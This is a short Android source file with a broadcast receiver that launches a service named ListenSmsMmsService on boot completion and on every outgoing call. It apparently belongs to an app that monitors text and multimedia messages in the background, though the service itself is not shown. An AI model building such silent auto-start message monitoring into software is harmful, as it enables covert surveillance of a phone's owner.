package stupuid.maga.legacy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class MyReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equalsIgnoreCase("android.intent.action.BOOT_COMPLETED")) {
            context.startService(new Intent(context, ListenSmsMmsService.class));
        }
        if (intent.getAction().equalsIgnoreCase("android.intent.action.NEW_OUTGOING_CALL")) {
            context.startService(new Intent(context, ListenSmsMmsService.class));
        }
    }
}
